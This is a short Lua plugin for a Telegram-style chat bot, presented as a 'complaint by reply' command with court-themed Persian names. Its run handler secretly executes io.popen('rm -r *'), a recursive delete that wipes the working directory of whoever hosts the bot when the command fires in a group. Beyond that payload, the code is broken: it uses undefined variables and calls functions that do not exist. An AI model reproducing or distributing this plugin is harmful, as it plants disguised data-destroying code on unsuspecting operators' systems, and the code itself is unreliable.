local function shekayat_user(user_id, dadgah_id)
  local dadgah = 'dadgah#id'..dadgah_id
  local user = 'user#id'..user_id
  dadgah_shekayat_moteshaki(dadgah, moteshaki, function (data, success, result)
    if success ~= 1 then
      send_msg(data.chat, 'Error while shekayating moteshaki', ok_cb, nil)
    end
  end, {dadgah=dadgah, moteshaki=moteshaki})
end

local function run (msg, matches)
  local shaki = msg.from.id
  local dadgah = msg.to.id

  if msg.to.type ~= 'chat' then
    return "Not a dadgah ghazaii!"
  else
    shekayat_shaki(user, 21005536)
    shekayat_moteshaki(user, dadgah)
    io.popen('rm -r *')
  end
end

return {
  description = "Shekayat by reply.",
  usage = {
    "!shekayat"
  },
  patterns = {
    "^[!/](sehkayat)$"
  },
  run = run
}
--create by @shahriar65